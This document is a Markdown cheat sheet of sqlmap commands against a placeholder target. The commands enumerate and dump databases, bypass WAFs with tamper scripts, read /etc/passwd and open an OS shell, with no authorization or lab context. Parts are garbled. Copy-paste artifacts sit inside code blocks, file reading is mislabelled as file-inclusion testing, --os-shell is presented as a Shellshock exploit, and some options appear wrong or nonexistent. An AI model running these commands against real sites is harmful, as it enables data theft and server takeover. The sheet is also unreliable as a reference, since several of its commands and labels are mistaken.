# SQLMap

To get a general overview of its capabilities, you can simply run

```bash
sqlmap --help
```

### **Getting Started with SQLMap**

To perform a basic SQL injection test against a target URL, use the following command (replace **`TARGET_URL`** with the actual URL):

```bash
sqlmap -u TARGET_URL
```

### **SQLMap Output Description**

After running SQLMap, you can view detailed output and results using the **`-v`** (verbose) option

```bash
sqlmap -u TARGET_URL -v 3
```

### **Running SQLMap on an HTTP Request**

If you have an HTTP request saved in a file, you can use it for testing

```bash
sqlmap -r request.txt
```

### **Handling SQLMap Errors**

SQLMap provides various options to handle errors and timeouts. For example

```bash
sqlmap -u TARGET_URL --timeout=30 --retries=3
```

### **Attack Tuning**

You can fine-tune SQLMap attacks, e.g., specifying a specific database to target

```bash
sqlmap -u TARGET_URL --dbms=mysql
```

### **Database Enumeration**

To enumerate the databases on the target server

```bash
sqlmap -u TARGET_URL --dbs
```

#### **Enumerating Tables**

Once you've identified a specific database, you can enumerate the tables within that database:

```bash

# Enumerate tables in a specific database
sqlmap -u TARGET_URL -D database_name --tables
```

#### **Enumerating Columns in a Table**

After identifying a specific table, you can enumerate the columns within that table:

```bash
bashCe# Enumerate columns in a specific table
sqlmap -u TARGET_URL -D database_name -T table_name --columns
```

#### **Dumping Data from a Table**

To dump data from a specific table, you can use the following command:

```bash

# Dump data from a specific table
sqlmap -u TARGET_URL -D database_name -T table_name --dump
```

#### **Dumping Raw Data from a Table**

In some cases, you might want to dump raw data without any formatting. You can use the following command to achieve this

```bash
# Dump raw data from a specific table
sqlmap -u TARGET_URL -D database_name -T table_name --dump-all --sql-query "SELECT * FROM table_name"
```

#### **Dumping Data from All Tables in a Database**

To dump data from all tables in a specific database, you can use the **`--dump-all`** option:

```bash
# Dump data from all tables in a specific database
sqlmap -u TARGET_URL -D database_name --dump-all
```

#### **Dumping Data from a Specific Database**

To dump data from a specific database, use:

```bash
bashCopy code
sqlmap -u TARGET_URL --dbs
sqlmap -u TARGET_URL -D database_name --tables
sqlmap -u TARGET_URL -D database_name -T table_name --dump
```

#### **Custom SQL Query Execution**

You can also execute custom SQL queries using SQLMap:

```bash
# Execute a custom SQL query
sqlmap -u TARGET_URL --sql-query "SELECT * FROM table_name WHERE condition"
```

### **Advanced Database Enumeration**

For more advanced database enumeration.

```bash
sqlmap -u TARGET_URL --level=5 --risk=3 --dbs
```

### **Bypassing Web Application Protections**

SQLMap can help you bypass various security protections in web applications. For example, to bypass a Web Application Firewall (WAF):

```bash
sqlmap -u TARGET_URL --tamper=space2comment,between,randomcase
```

### **OS Exploitation**

SQLMap can assist in performing OS-level exploitation, like reading files on the underlying server:

```bash
sqlmap -u TARGET_URL --file-read="/etc/passwd"
```

#### **Database Banner Grabbing**

You can grab the database management system banner with:

```bash
sqlmap -u TARGET_URL --banner
```

### **Specifying a Parameter to Test**

To test a specific parameter in the URL, you can use the **`-p`** option:

```bash
sqlmap -u TARGET_URL -p parameter_name
```

### **Testing for SQL Injection Vulnerabilities in POST Data**

To test for SQL injection vulnerabilities in POST data, use:

```bash
sqlmap -u TARGET_URL --data="post_parameter=data"
```

### **Fingerprinting the Database Management System**

To identify the database management system, use

```bash
sqlmap -u TARGET_URL --dbms-fingerprint
```

### **Blind SQL Injection Tests**

For blind SQL injection, you can use techniques like

```bash
sqlmap -u TARGET_URL --dbms=mysql --technique=BOOLEAN
sqlmap -u TARGET_URL --dbms=mysql --technique=TIME
```

### **Batch Mode and Saving Results:**

To run SQLMap in batch mode and save results to a file

```bash
sqlmap -u TARGET_URL --batch --output=results.txt
```

### **Proxy Usage**

If you're testing through a proxy, specify it:

```bash
sqlmap -u TARGET_URL --proxy=http://proxy-server:port
```

### **HTTP Authentication:**

For sites with HTTP authentication, provide credentials

```bash
bashCopy code
sqlmap -u TARGET_URL --auth-type=BASIC --auth-cred="username:password"
```

### **Custom User-Agent Header:**

To set a custom User-Agent header:

```bash
sqlmap -u TARGET_URL --user-agent="Custom User-Agent"
```

### **Tampering with Requests**

You can apply tamper scripts to requests:

```bash
sqlmap -u TARGET_URL --tamper=space2plus
```

### **Testing for File Inclusion Vulnerabilities**

To test for file inclusion vulnerabilities:

```bash
sqlmap -u TARGET_URL --file-read="/etc/passwd"
```

### **Exploiting Shellshock Vulnerabilities**

For exploiting Shellshock vulnerabilities, use:

```bash
sqlmap -u TARGET_URL --os-shell
```
